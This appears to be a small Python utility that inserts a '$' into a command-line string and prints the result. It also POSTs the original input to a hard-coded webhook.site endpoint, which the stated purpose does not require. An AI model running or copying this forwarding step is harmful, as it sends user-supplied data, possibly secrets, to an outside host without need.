import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) > 1:
        input_string = sys.argv[1]
        # add $ after the first character
        manipulated_string = input_string[0] + '$' + input_string[1:]
        print(f"Received string: {input_string}")
        print(f"Manipulated string: {manipulated_string}")
        
        webhook_url = "https://webhook.site/e352210e-d3d0-499d-8dc9-0649a4638088"
        data = {"original": input_string}
        response = requests.post(webhook_url, json=data)
        if response.status_code == 200:
            print("Data sent successfully to the webhook.")
            print(f"Response from webhook: {response.text}")
    else:
        print("No string argument provided")